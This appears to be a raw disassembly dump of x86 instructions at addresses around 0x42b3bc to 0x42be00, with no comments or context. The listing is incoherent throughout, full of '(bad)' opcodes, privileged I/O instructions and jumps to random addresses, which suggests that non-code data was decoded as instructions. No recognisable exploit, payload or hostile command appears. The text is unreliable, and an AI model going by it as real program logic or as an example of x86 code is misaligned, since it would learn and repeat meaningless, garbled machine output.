  42b3bc:	mov    ebx,0x5c3a98ba
  42b3c1:	aaa    
  42b3c2:	mov    BYTE PTR [ebx+0x367bd8ef],bl
  42b3c8:	xor    dl,BYTE PTR [edx]
  42b3ca:	iret   
  42b3cb:	sub    eax,0xc363cd30
  42b3d0:	shr    BYTE PTR [esi],1
  42b3d2:	sub    dh,bl
  42b3d4:	imul   edi,DWORD PTR [ebp+0x7],0xffffff8a
  42b3d8:	frstor [edx+0x25]
  42b3db:	(bad)  
  42b3dd:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42b3df:	jno    0x42b450
  42b3e1:	arpl   WORD PTR ds:0x4e708895,ax
  42b3e7:	stos   BYTE PTR es:[edi],al
  42b3e8:	xchg   ecx,eax
  42b3e9:	jge    0x42b3c6
  42b3eb:	mov    al,0xb4
  42b3ee:	out    0xf5,al
  42b3f0:	or     ebx,DWORD PTR [ebx+eiz*2]
  42b3f3:	stc    
  42b3f4:	mov    ebx,edi
  42b3f6:	cmp    al,0x2f
  42b3f8:	mov    al,0x45
  42b3fa:	scas   eax,DWORD PTR es:[edi]
  42b3fb:	mov    cl,BYTE PTR [esi-0x19]
  42b3fe:	jmp    0xc5adde08
  42b403:	mov    ebp,0x64ceb812
  42b408:	test   eax,0x22973bdb
  42b40d:	aam    0x38
  42b40f:	lds    eax,FWORD PTR ds:0x9092dcc0
  42b415:	outs   dx,DWORD PTR ds:[esi]
  42b416:	xchg   esi,eax
  42b417:	jno    0x42b428
  42b419:	and    DWORD PTR [eax+0x43aba630],esi
  42b41f:	mov    WORD PTR [ebx],gs
  42b421:	sub    al,0x5d
  42b423:	sbb    al,0xba
  42b425:	adc    bl,BYTE PTR [ecx+0x60]
  42b428:	dec    eax
  42b429:	ds jbe 0x42b3e9
  42b42c:	popa   
  42b42d:	out    dx,eax
  42b42e:	out    0x1e,al
  42b430:	mov    dl,dh
  42b432:	fidivr WORD PTR [esi-0x55303da7]
  42b438:	push   es
  42b439:	repnz and esi,DWORD PTR [eax]
  42b43c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b43d:	gs stos BYTE PTR es:[edi],al
  42b43f:	push   cs
  42b440:	rol    BYTE PTR [eax],cl
	...
  42b4b2:	add    BYTE PTR [eax],al
  42b4b4:	sbb    BYTE PTR [edi+0x17],cl
  42b4b7:	mov    ecx,0xefbef957
  42b4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4bd:	fstp   QWORD PTR [esi+0x5]
  42b4c0:	je     0x42b50f
  42b4c2:	cs dec eax
  42b4c4:	inc    edi
  42b4c5:	retf   0x1
  42b4c8:	cmc    
  42b4c9:	add    BYTE PTR [eax],al
  42b4cb:	add    BYTE PTR [ebp-0x14e57862],dh
  42b4d1:	imul   ebp,DWORD PTR [ecx+0x26ccee1a],0x4f
  42b4d8:	std    
  42b4d9:	mov    ebx,0x45cb90e4
  42b4de:	fist   DWORD PTR [eax+0x4fc3f733]
  42b4e4:	cld    
  42b4e5:	mov    BYTE PTR [ebx],0x87
  42b4e8:	inc    ebx
  42b4e9:	sti    
  42b4ea:	or     DWORD PTR [ebx+0x16],0x566acefc
  42b4f1:	pop    edi
  42b4f2:	sbb    eax,0x535258cc
  42b4f7:	into   
  42b4f8:	call   0x6352:0xc4de4484
  42b4ff:	stos   BYTE PTR es:[edi],al
  42b500:	add    ecx,DWORD PTR [esi-0xdbdb7bd]
  42b506:	jne    0x42b4f5
  42b508:	repz std 
  42b50a:	adc    eax,0xd9ae72e3
  42b50f:	ficomp DWORD PTR [edi-0xf]
  42b512:	mov    ecx,DWORD PTR [ecx-0x61]
  42b515:	xlat   BYTE PTR ds:[ebx]
  42b516:	xchg   edx,eax
  42b517:	xchg   ebx,eax
  42b518:	sub    eax,0xfcac07bd
  42b51d:	les    eax,FWORD PTR [eax-0x54]
  42b520:	xchg   edi,eax
  42b521:	xor    BYTE PTR [ebx-0x1cd935a6],dl
  42b527:	cmp    eax,0xbcb80194
  42b52c:	popf   
  42b52d:	into   
  42b52e:	push   esp
  42b52f:	ret    
  42b530:	xchg   ecx,eax
  42b531:	in     al,dx
  42b532:	dec    esp
  42b533:	pop    eax
  42b534:	pop    edi
  42b535:	popa   
  42b536:	pop    eax
  42b537:	dec    ebp
  42b538:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b539:	dec    ebp
  42b53a:	fnstenv [ebx-0x6aac740e]
  42b540:	rcr    BYTE PTR [ebx],cl
  42b542:	test   al,0x5e
  42b544:	adc    al,0x35
  42b546:	jne    0x42b578
  42b548:	cmc    
  42b549:	inc    eax
  42b54a:	cmp    al,0x29
  42b54c:	scas   al,BYTE PTR es:[edi]
  42b54d:	cmp    al,0x12
  42b54f:	cs push ds
  42b551:	fidiv  DWORD PTR [edx+0xceab72d]
  42b557:	mov    ch,0x2e
  42b559:	test   cl,0x9b
  42b55c:	fstp   TBYTE PTR [esi]
  42b55e:	xlat   BYTE PTR ds:[ebx]
  42b55f:	cdq    
  42b560:	xchg   esi,eax
  42b561:	fisub  WORD PTR [ebx+0x3b]
  42b564:	or     eax,0xb43ad214
  42b569:	and    al,0x5d
  42b56b:	pop    esp
  42b56c:	jmp    0xb852066
  42b571:	mov    al,0x69
  42b573:	xor    eax,DWORD PTR [edx]
  42b575:	sub    ah,BYTE PTR [eax+0x614160fc]
  42b57b:	loop   0x42b59e
  42b57d:	enter  0x4ba9,0x60
  42b581:	jne    0x42b57f
  42b583:	add    BYTE PTR [ebx-0x16],0xa5
  42b587:	mov    edx,0x1f640975
  42b58c:	icebp  
  42b58d:	pop    edi
  42b58e:	outs   dx,BYTE PTR ds:[esi]
  42b58f:	push   edx
  42b590:	gs int3 
  42b592:	jmp    0x23c01f79
  42b597:	pop    ebx
  42b598:	add    ebp,DWORD PTR [esi+esi*2+0x26c2c6ef]
  42b59f:	cs jmp 0x42b549
  42b5a2:	or     bh,BYTE PTR [edx]
  42b5a4:	jg     0x42b5be
  42b5a6:	adc    bh,BYTE PTR [ebx+0xfb99a0e]
  42b5ac:	pop    ecx
  42b5ad:	add    dl,BYTE PTR ds:0x338f02d1
  42b5b3:	adc    DWORD PTR [edi-0x2ad7c6c7],ecx
  42b5b9:	out    0xd1,eax
  42b5bb:	jecxz  0x42b547
  42b5bd:	fisubr WORD PTR [ecx]
  42b5bf:	lds    edx,FWORD PTR [ebx+0x0]
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    ch,BYTE PTR [ecx-0x1]
  42b642:	lds    ebp,FWORD PTR ds:0x1cb3c
  42b648:	cmc    
  42b649:	add    BYTE PTR [eax],al
  42b64b:	add    BYTE PTR [edx+eax*8-0x3c0e08a0],ah
  42b652:	aam    0x94
  42b654:	enter  0xa814,0x47
  42b658:	push   ebx
  42b659:	pop    ecx
  42b65a:	dec    ecx
  42b65b:	or     BYTE PTR [edx],bl
  42b65d:	xchg   dl,al
  42b65f:	jbe    0x42b5fb
  42b661:	mov    bh,0x4b
  42b663:	pop    esp
  42b664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b665:	into   
  42b666:	scas   eax,DWORD PTR es:[edi]
  42b667:	add    BYTE PTR [ebp+0x2a],bh
  42b66a:	outs   dx,DWORD PTR ds:[esi]
  42b66b:	and    ebx,DWORD PTR [ebp+0x60d56934]
  42b671:	xchg   ecx,eax
  42b672:	repnz clc 
  42b674:	lahf   
  42b675:	mov    ch,0x98
  42b677:	in     al,dx
  42b678:	xor    eax,ebx
  42b67a:	xor    ch,bl
  42b67c:	xlat   BYTE PTR ds:[ebx]
  42b67d:	lods   al,BYTE PTR ds:[esi]
  42b67e:	mov    eax,0x6fd63bc3
  42b683:	mov    eax,ds:0x5b0a1c6a
  42b688:	xor    bl,dl
  42b68a:	and    DWORD PTR [ecx],ebp
  42b68c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b68e:	not    DWORD PTR [ebp+0x49730ab2]
  42b694:	(bad)  
  42b695:	or     BYTE PTR [edx-0x51d3ed2c],bh
  42b69b:	jae    0x42b693
  42b69d:	jle    0x42b6d0
  42b69f:	cmp    ecx,DWORD PTR [ebx]
  42b6a1:	sbb    ebx,0x6b
  42b6a4:	lods   eax,DWORD PTR ds:[esi]
  42b6a5:	arpl   sp,si
  42b6a7:	jge    0x42b70b
  42b6a9:	mov    DWORD PTR [ebp+0x4df8f1f6],eax
  42b6af:	sub    bl,bl
  42b6b1:	or     BYTE PTR [esi+0x2],0xeb
  42b6b5:	(bad)
  42b6b8:	jl     0x42b6f9
  42b6ba:	pop    edi
  42b6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b6bc:	cli    
  42b6bd:	inc    ecx
  42b6be:	mov    bh,0x46
  42b6c0:	push   cs
  42b6c1:	or     edx,edi
  42b6c3:	pop    ds
  42b6c4:	jb     0x42b72a
  42b6c6:	fcmovnb st,st(0)
  42b6c8:	xor    esp,DWORD PTR [eax-0x14136372]
  42b6ce:	mov    dh,0x57
  42b6d0:	scas   al,BYTE PTR es:[edi]
  42b6d1:	sbb    BYTE PTR [edx-0x20],0x2a
  42b6d5:	push   ebp
  42b6d6:	inc    ecx
  42b6d7:	pop    ebp
  42b6d8:	or     BYTE PTR ds:0x5ca8622e,bl
  42b6de:	repz push eax
  42b6e0:	jmp    0x42b66f
  42b6e2:	outs   dx,BYTE PTR ds:[esi]
  42b6e3:	idiv   BYTE PTR [edi+0x1ba10424]
  42b6e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6ea:	(bad)  
  42b6eb:	jne    0x42b73e
  42b6ed:	scas   eax,DWORD PTR es:[edi]
  42b6ee:	adc    dh,BYTE PTR [esi+esi*4]
  42b6f1:	(bad)  
  42b6f3:	and    ebp,ecx
  42b6f5:	or     al,0xb5
  42b6f7:	mov    dh,ch
  42b6f9:	fcom   st(7)
  42b6fb:	sub    eax,0xc668d96
  42b700:	sbb    al,0xf5
  42b702:	add    dh,BYTE PTR [eax+0x776341e6]
  42b708:	ficom  DWORD PTR [eax]
  42b70a:	mov    al,ds:0x426e41fc
  42b70f:	pop    ebx
  42b710:	retf   0x75c6
  42b713:	leave  
  42b714:	adc    esi,eax
  42b716:	fidivr WORD PTR [esi]
  42b718:	pop    ebp
  42b719:	outs   dx,BYTE PTR ds:[esi]
  42b71a:	in     al,dx
  42b71b:	mov    esp,0x5940d0f3
  42b720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b721:	cmc    
  42b722:	jb     0x42b6c5
  42b724:	sbb    eax,esi
  42b726:	and    eax,0xd80c0ba6
  42b72b:	shl    al,cl
  42b72d:	add    ecx,DWORD PTR [ebp+0x5a3b61d0]
  42b733:	jbe    0x42b6c9
  42b735:	add    al,0x1c
  42b737:	js     0x42b6ec
  42b739:	push   ebx
  42b73a:	rol    bl,0xba
  42b73d:	or     DWORD PTR [ebx+0x5f],0xee
	...
  42b7b4:	mov    ah,BYTE PTR [ebp+0x63]
  42b7b7:	mov    edi,0x75debfef
  42b7bc:	push   0xffffff98
  42b7be:	xor    eax,0xc8cc9cfb
  42b7c3:	xchg   ecx,eax
  42b7c4:	xor    esp,ecx
  42b7c6:	add    DWORD PTR [eax],eax
  42b7c8:	cmc    
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    cl,bh
  42b7cd:	rol    BYTE PTR [ebx+ecx*4-0x7d],0x54
  42b7d2:	fs jl  0x42b828
  42b7d5:	and    ebx,ebx
  42b7d7:	clc    
  42b7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b7d9:	adc    eax,0xfe62eac3
  42b7de:	dec    ecx
  42b7df:	push   eax
  42b7e0:	or     ebx,eax
  42b7e2:	fwait
  42b7e3:	iret   
  42b7e4:	lods   eax,DWORD PTR ds:[esi]
  42b7e5:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42b7e7:	ret    0x93e5
  42b7ea:	xor    eax,0x920a6387
  42b7ef:	push   ebx
  42b7f0:	mov    ch,0x16
  42b7f2:	ins    DWORD PTR es:[edi],dx
  42b7f3:	lods   eax,DWORD PTR ds:[esi]
  42b7f4:	ficom  DWORD PTR [eax]
  42b7f6:	mov    al,0x6c
  42b7f8:	and    eax,0x511b6dba
  42b7fd:	ja     0x42b7ac
  42b7ff:	pop    es
  42b800:	rol    DWORD PTR [edi+0x125caeec],1
  42b806:	jp     0x42b7e8
  42b808:	cmp    DWORD PTR [edi+eiz*2],ecx
  42b80b:	add    al,0x4c
  42b80d:	add    DWORD PTR [ecx-0x21],0x8415725b
  42b814:	mov    cl,0xaf
  42b816:	sub    DWORD PTR [eax-0x7140e8fa],ecx
  42b81c:	test   al,0x1c
  42b81e:	cmc    
  42b81f:	in     al,0xbf
  42b821:	pop    esi
  42b822:	popf   
  42b823:	cs cld 
  42b825:	test   al,0x77
  42b827:	sahf   
  42b828:	or     DWORD PTR es:[edx],0xa6cb5e88
  42b82f:	inc    edx
  42b830:	imul   ecx,DWORD PTR [edi+0x2b],0xfffffffe
  42b834:	jbe    0x42b7c5
  42b836:	cwde   
  42b837:	int    0xfa
  42b839:	fiadd  WORD PTR [edi+edi*1+0x8e8fa9d]
  42b840:	sbb    al,0x62
  42b842:	or     al,0x41
  42b844:	push   es
  42b845:	xchg   esi,eax
  42b846:	pop    edi
  42b847:	mov    al,0xc7
  42b849:	pop    ds
  42b84a:	pop    ebp
  42b84b:	in     eax,0xed
  42b84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b84e:	mov    DWORD PTR [eax+edi*2],esp
  42b851:	sub    BYTE PTR [eax+0x5f88a5d2],ch
  42b857:	pop    es
  42b858:	mov    ebx,0x2fb9da4
  42b85d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b85e:	nop
  42b85f:	push   edi
  42b860:	lods   eax,DWORD PTR ds:[esi]
  42b861:	(bad)  
  42b862:	nop
  42b863:	clc    
  42b864:	push   0x50
  42b866:	mov    eax,0x544f9e58
  42b86b:	out    0xb7,al
  42b86d:	xor    al,0x60
  42b86f:	adc    dl,BYTE PTR [edx-0x34]
  42b872:	retf   0xcda6
  42b875:	push   edi
  42b876:	add    DWORD PTR [edx+0x36c48751],edi
  42b87c:	inc    edx
  42b87d:	lods   al,BYTE PTR gs:[esi]
  42b87f:	add    esi,ebp
  42b881:	test   DWORD PTR [ebx],esi
  42b883:	xor    ah,BYTE PTR [edi-0x7a]
  42b886:	pop    eax
  42b887:	and    BYTE PTR [ebp+0x6f33a133],cl
  42b88d:	or     eax,0xb6192217
  42b892:	sub    DWORD PTR [ecx],ecx
  42b894:	or     cl,bh
  42b896:	xor    eax,0xc4f9ad08
  42b89b:	mov    ecx,0x496a16b9
  42b8a0:	lods   eax,DWORD PTR ds:[esi]
  42b8a1:	leave  
  42b8a2:	or     ebx,DWORD PTR [ebp-0x14]
  42b8a5:	cmp    DWORD PTR [ecx],eax
  42b8a7:	jmp    0xea08:0x7b0b7ed6
  42b8ae:	test   al,0xef
  42b8b0:	or     DWORD PTR [esi+eiz*8],0xa9e918a7
  42b8b7:	shr    BYTE PTR [eax-0x36b12be7],1
  42b8bd:	aaa    
  42b8be:	push   esp
  42b8bf:	mov    esi,0x37
	...
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	test   al,0x95
  42b942:	xor    ecx,edx
  42b944:	es int 0x1
  42b947:	add    ch,dh
  42b949:	add    BYTE PTR [eax],al
  42b94b:	add    bl,ch
  42b94d:	das    
  42b94e:	mov    dh,0x4a
  42b950:	data16 ja 0x42b8dc
  42b953:	in     eax,0xea
  42b955:	out    0xe1,al
  42b957:	(bad)  
  42b958:	push   esp
  42b959:	push   es
  42b95a:	mov    dl,bh
  42b95c:	inc    edi
  42b95d:	mov    edx,0x3accc851
  42b962:	mov    dl,0xcd
  42b964:	rcr    DWORD PTR [ecx+ebp*4-0x38],1
  42b968:	pop    ecx
  42b969:	ret    0xef41
  42b96c:	call   0x53be:0xc47246f2
  42b973:	daa    
  42b974:	hlt    
  42b975:	and    ebp,DWORD PTR [edi-0x5f]
  42b978:	(bad)  
  42b979:	jmp    0xb521885f
  42b97e:	stos   DWORD PTR es:[edi],eax
  42b97f:	(bad)  
  42b980:	clc    
  42b981:	push   0x43
  42b983:	pop    ds
  42b984:	add    al,0xbc
  42b986:	pop    DWORD PTR ds:0x7c74cbe1
  42b98c:	enter  0xd9f3,0xf9
  42b990:	bound  eax,QWORD PTR [ebp-0x8]
  42b993:	adc    edi,ecx
  42b995:	mov    eax,ds:0xfed8b59c
  42b99a:	or     dh,BYTE PTR [eax]
  42b99c:	jle    0x42b93d
  42b99e:	test   ebp,edi
  42b9a0:	pusha  
  42b9a1:	mov    WORD PTR [edx],cs
  42b9a3:	pushf  
  42b9a4:	xor    BYTE PTR [eax+eiz*1],0x11
  42b9a8:	fadd   QWORD PTR [ebp-0x6e]
  42b9ab:	inc    ecx
  42b9ac:	jmp    0xdf92007a
  42b9b1:	loope  0x42b98b
  42b9b3:	xor    DWORD PTR [ebx+0x29f4b598],0xbaf8c5d4
  42b9bd:	fwait
  42b9be:	jl     0x42b959
  42b9c0:	pop    edi
  42b9c1:	sub    dh,ch
  42b9c3:	cli    
  42b9c4:	mov    ecx,ecx
  42b9c6:	xor    DWORD PTR [ecx],eax
  42b9c8:	mov    gs,WORD PTR [ecx+edi*1+0x78]
  42b9cc:	mov    WORD PTR [esi+0x64],cs
  42b9cf:	xchg   esp,eax
  42b9d0:	sbb    edi,DWORD PTR [eax*1-0x55c0aa99]
  42b9d7:	mov    dl,0x20
  42b9d9:	jb     0x42b99f
  42b9db:	js     0x42b9b8
  42b9dd:	test   eax,0x11c6978e
  42b9e2:	inc    edx
  42b9e3:	fwait
  42b9e4:	bound  esi,QWORD PTR [esi+ebx*8]
  42b9e7:	push   ebx
  42b9e8:	dec    esi
  42b9e9:	xor    cl,BYTE PTR [edi]
  42b9eb:	jmp    0x3ecd:0xac9d9fae
  42b9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b9f3:	int    0x4e
  42b9f5:	push   ebp
  42b9f6:	pop    ecx
  42b9f7:	mov    ecx,0x9112820b
  42b9fc:	push   0xffffffad
  42b9fe:	leave  
  42b9ff:	outs   dx,DWORD PTR ds:[esi]
  42ba00:	ror    DWORD PTR [ebx-0x6c06b582],0x18
  42ba07:	pop    edx
  42ba08:	pusha  
  42ba09:	push   ecx
  42ba0a:	call   0xcbc91a0b
  42ba0f:	lods   eax,DWORD PTR ds:[esi]
  42ba10:	jnp    0x42b9a3
  42ba12:	(bad)  
  42ba13:	std    
  42ba14:	or     edi,esi
  42ba16:	gs jl  0x42ba01
  42ba19:	into   
  42ba1a:	push   edx
  42ba1b:	jmp    0x6433:0x9a1f1715
  42ba22:	sahf   
  42ba23:	jb     0x42ba86
  42ba25:	fdivp  st(4),st
  42ba27:	xchg   BYTE PTR [ebx+ebx*2],cl
  42ba2a:	in     al,0x7e
  42ba2c:	das    
  42ba2d:	js     0x42b9f6
  42ba2f:	mov    esp,0xdd694ce9
  42ba34:	mov    esi,0x2e3a1f4e
  42ba39:	inc    ebx
  42ba3a:	add    DWORD PTR ds:0xe8a7f6da,edx
  42ba40:	pop    ds
	...
  42bab1:	add    BYTE PTR [eax],al
  42bab3:	add    BYTE PTR [esi],bh
  42bab5:	push   cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi+0x1f40434c]
  42bac2:	cwde   
  42bac3:	test   BYTE PTR [ebx],bl
  42bac5:	into   
  42bac6:	add    DWORD PTR [eax],eax
  42bac8:	cmc    
  42bac9:	add    BYTE PTR [eax],al
  42bacb:	add    BYTE PTR [edx+esi*1+0x20337c0a],bh
  42bad2:	icebp  
  42bad3:	push   ecx
  42bad4:	mov    bl,0x82
  42bad6:	jecxz  0x42ba79
  42bad8:	push   es
  42bad9:	xchg   esp,eax
  42bada:	mov    ds:0x89f95010,eax
  42badf:	(bad)  
  42bae0:	push   ebx
  42bae1:	mov    ah,0x66
  42bae3:	in     eax,0x48
  42bae5:	fcomp  QWORD PTR [ebx+edi*8-0x64]
  42bae9:	in     al,0x1
  42baeb:	arpl   WORD PTR [eax],bx
  42baed:	mov    al,0xbe
  42baef:	cmp    ebx,DWORD PTR [edi]
  42baf1:	sub    edx,DWORD PTR [ecx+ebx*4+0x7d6e486e]
  42baf8:	cmp    ch,dh
  42bafa:	push   0x8acfc821
  42baff:	xchg   edx,eax
  42bb00:	repz cmp al,dl
  42bb03:	dec    ebp
  42bb04:	push   esi
  42bb05:	add    esp,DWORD PTR [edx-0x6a]
  42bb08:	mov    edx,0xac147b55
  42bb0d:	dec    edi
  42bb0e:	push   edx
  42bb0f:	xor    ah,BYTE PTR [edx-0x2b1cf6b4]
  42bb15:	sbb    eax,0xd93ed0f8
  42bb1a:	cmp    BYTE PTR [edi-0x6c],0x58
  42bb1e:	pop    ss
  42bb1f:	dec    BYTE PTR [ebx+eax*4-0x11ca1eae]
  42bb26:	loopne 0x42bb7c
  42bb28:	stc    
  42bb29:	xchg   ebx,eax
  42bb2a:	test   DWORD PTR [eax-0x1c7637e7],ecx
  42bb30:	cld    
  42bb31:	sahf   
  42bb32:	ficom  DWORD PTR [ebx-0x314e2508]
  42bb38:	xchg   edx,eax
  42bb39:	hlt    
  42bb3a:	sbb    al,0xb5
  42bb3c:	dec    edx
  42bb3d:	push   cs
  42bb3e:	push   cs
  42bb3f:	or     al,0x5d
  42bb41:	and    dl,ch
  42bb43:	mov    edi,0x4575fb84
  42bb48:	sub    eax,0x9db192c
  42bb4d:	and    DWORD PTR [edi-0x6e21cfc0],ebx
  42bb53:	cld    
  42bb54:	ret    0x7c6
  42bb57:	stos   BYTE PTR es:[edi],al
  42bb58:	xchg   edx,eax
  42bb59:	in     eax,dx
  42bb5a:	inc    ebx
  42bb5b:	(bad)  
  42bb5d:	or     bh,BYTE PTR [esi+0x27]
  42bb60:	inc    esi
  42bb61:	shr    dh,1
  42bb63:	sbb    DWORD PTR [eax-0x66fe7d6d],edx
  42bb69:	clc    
  42bb6a:	xchg   edi,eax
  42bb6b:	call   0x8a08e57f
  42bb70:	xchg   edi,eax
  42bb71:	push   ds
  42bb72:	or     al,BYTE PTR [ebp+0x70]
  42bb75:	mov    al,0x96
  42bb77:	bound  esi,QWORD PTR [ebx+0x69478662]
  42bb7d:	mov    eax,0x73d9a58f
  42bb82:	and    DWORD PTR [edi],esi
  42bb84:	mov    bl,0x33
  42bb86:	and    BYTE PTR [edx],dh
  42bb88:	iret   
  42bb89:	test   BYTE PTR [edi+0x54],cl
  42bb8c:	inc    edi
  42bb8d:	stc    
  42bb8e:	pop    ebx
  42bb8f:	stos   DWORD PTR es:[edi],eax
  42bb90:	pop    ds
  42bb91:	in     eax,0xbd
  42bb93:	aam    0x58
  42bb95:	push   ds
  42bb96:	xchg   ecx,eax
  42bb97:	gs sar esp,cl
  42bb9a:	cmp    DWORD PTR [eax+0x38400988],esp
  42bba0:	inc    ecx
  42bba1:	daa    
  42bba2:	call   0xf7b18473
  42bba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bba8:	cwde   
  42bba9:	or     esp,esp
  42bbab:	inc    ebp
  42bbac:	(bad)  
  42bbad:	mov    ecx,0x60608d85
  42bbb2:	jle    0x42bc1c
  42bbb4:	or     ebx,ecx
  42bbb6:	scas   al,BYTE PTR es:[edi]
  42bbb7:	(bad)  
  42bbb8:	fist   DWORD PTR [eax]
  42bbba:	mov    ah,0x32
  42bbbc:	repnz pop es
  42bbbe:	dec    ecx
  42bbbf:	pop    ss
  42bbc0:	daa    
	...
  42bc31:	add    BYTE PTR [eax],al
  42bc33:	add    cl,ch
  42bc35:	xor    bl,BYTE PTR [edx+edi*1]
  42bc38:	fistp  QWORD PTR [esi]
  42bc3a:	out    dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0xd0
  42bc41:	xchg   edi,eax
  42bc42:	or     cl,dl
  42bc44:	adc    bh,cl
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	cmc    
  42bc49:	add    BYTE PTR [eax],al
  42bc4b:	add    BYTE PTR [eax],bl
  42bc4d:	shl    BYTE PTR [esp+ecx*8],cl
  42bc50:	or     eax,esp
  42bc52:	test   al,0x44
  42bc54:	enter  0x7fa,0x46
  42bc58:	xchg   edx,eax
  42bc59:	inc    ecx
  42bc5a:	fwait
  42bc5b:	adc    eax,0x7f2c9c64
  42bc60:	cmp    esp,DWORD PTR [edx+0x24]
  42bc63:	jb     0x42bca4
  42bc65:	jmp    0xd646625c
  42bc6a:	mov    edx,0x2daa28c7
  42bc6f:	leave  
  42bc70:	int3   
  42bc71:	dec    esp
  42bc72:	or     BYTE PTR [edi+0x33ca094],al
  42bc78:	dec    ecx
  42bc79:	cdq    
  42bc7a:	push   es
  42bc7b:	cmp    edi,DWORD PTR [edi+0x6a]
  42bc7e:	adc    ecx,eax
  42bc80:	rdmsr  
  42bc82:	jmp    0xc8c912c9
  42bc87:	sti    
  42bc88:	in     al,dx
  42bc89:	sbb    bh,bh
  42bc8b:	fisttp DWORD PTR [eax+0xbe10d31]
  42bc91:	shl    edi,0x4c
  42bc94:	adc    al,0xf7
  42bc96:	int3   
  42bc97:	ja     0x42bce7
  42bc99:	rcl    DWORD PTR [ebx-0x2460e39a],1
  42bc9f:	stos   BYTE PTR es:[edi],al
  42bca0:	lods   al,BYTE PTR ds:[esi]
  42bca1:	hlt    
  42bca2:	retf   
  42bca3:	add    DWORD PTR [edi-0x16],edi
  42bca6:	mov    esi,0x9ac890a1
  42bcab:	mov    eax,ds:0x360cdf4b
  42bcb0:	push   cs
  42bcb1:	test   DWORD PTR [ebp+eiz*4+0x20],ebp
  42bcb5:	mov    cs:0x6e1768bc,eax
  42bcbb:	mov    ah,0xeb
  42bcbd:	gs inc esp
  42bcbf:	xor    edx,edx
  42bcc1:	jnp    0x42bc7d
  42bcc3:	int3   
  42bcc4:	mov    ah,0xc3
  42bcc6:	lahf   
  42bcc7:	or     esp,DWORD PTR [edx+0x55]
  42bcca:	push   0x11
  42bccc:	scas   eax,DWORD PTR es:[edi]
  42bccd:	sti    
  42bcce:	or     al,0x4f
  42bcd0:	cmp    al,0xc8
  42bcd2:	cwde   
  42bcd3:	sub    eax,0x88b57b21
  42bcd8:	call   0xbaba046d
  42bcdd:	adc    al,0x3b
  42bcdf:	fs std 
  42bce1:	inc    edi
  42bce2:	mov    DWORD PTR [ecx+0x66],ebx
  42bce5:	cmp    al,BYTE PTR [edx]
  42bce7:	mov    edx,0xcf87e234
  42bcec:	dec    edx
  42bced:	inc    ebx
  42bcee:	dec    esi
  42bcef:	mov    ecx,0xb224cc03
  42bcf4:	cmp    al,0xaf
  42bcf6:	cmc    
  42bcf7:	mov    DWORD PTR [ebx+0x70b78616],edx
  42bcfd:	dec    ebx
  42bcfe:	mov    ds:0xa26ff70b,al
  42bd03:	xchg   BYTE PTR [ebx-0x719cfcc5],dh
  42bd09:	dec    esi
  42bd0a:	fcmovb st,st(3)
  42bd0c:	inc    edi
  42bd0d:	out    dx,eax
  42bd0e:	push   ds
  42bd0f:	and    esi,ebp
  42bd11:	lock fisub DWORD PTR [ebx+0x65]
  42bd15:	push   ecx
  42bd16:	sahf   
  42bd17:	fisttp WORD PTR [eax]
  42bd19:	add    edx,DWORD PTR [edi+edx*2]
  42bd1c:	in     al,0x8a
  42bd1e:	inc    edx
  42bd1f:	data16 cld 
  42bd21:	imul   eax,DWORD PTR [eax+0x33],0x3d644419
  42bd28:	stos   BYTE PTR es:[edi],al
  42bd29:	bound  edi,QWORD PTR [ebp-0x6a]
  42bd2c:	adc    al,0xf2
  42bd2e:	mov    eax,ebx
  42bd30:	daa    
  42bd31:	add    DWORD PTR [ebp-0x6c971e8a],edx
  42bd37:	fimul  DWORD PTR [ebx+ebp*1]
  42bd3a:	or     esi,DWORD PTR ds:0xc233d7f
  42bd40:	test   BYTE PTR [eax],al
	...
  42bdb2:	add    BYTE PTR [eax],al
  42bdb4:	mov    edi,0x4a8e4af7
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	adc    ecx,esi
  42bdc2:	inc    ebx
  42bdc3:	push   0x5
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    ch,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    cl,al
  42bdcd:	push   0xffffffb3
  42bdcf:	jecxz  0x42bd87
  42bdd1:	imul   esi,DWORD PTR [ebp-0x68],0x24
  42bdd5:	xchg   DWORD PTR [edx],ebx
  42bdd7:	js     0x42be33
  42bdd9:	sbb    al,0x1c
  42bddb:	xchg   ecx,eax
  42bddc:	mov    ebx,0xcfd5fc7e
  42bde1:	sub    eax,0x5a521195
  42bde6:	dec    esi
  42bde7:	fistp  WORD PTR [ebx-0x31]
  42bdea:	push   0xffffffe1
  42bdec:	xor    eax,0x119f1530
  42bdf1:	jmp    0xcd589c9e
  42bdf6:	fwait
  42bdf7:	inc    esi
  42bdf8:	imul   eax,ebp,0x5a267a60
  42bdfe:	jne    0x42be49
